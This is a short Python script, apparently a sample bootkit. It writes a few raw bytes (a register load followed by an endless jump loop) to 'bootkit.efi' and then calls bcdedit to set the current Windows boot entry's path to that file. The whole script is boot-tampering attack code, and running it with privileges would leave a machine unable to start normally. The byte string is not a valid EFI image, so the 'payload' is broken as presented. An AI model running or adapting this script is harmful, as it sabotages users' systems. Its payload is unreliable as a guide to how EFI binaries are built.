import os

efi_payload = b"\xB8\xBE\xBA\xFE\xCA\xEB\xFE"
with open("bootkit.efi", "wb") as f:
    f.write(efi_payload)

os.system("bcdedit /set {current} path \\EFI\\Microsoft\\Boot\\bootkit.efi")
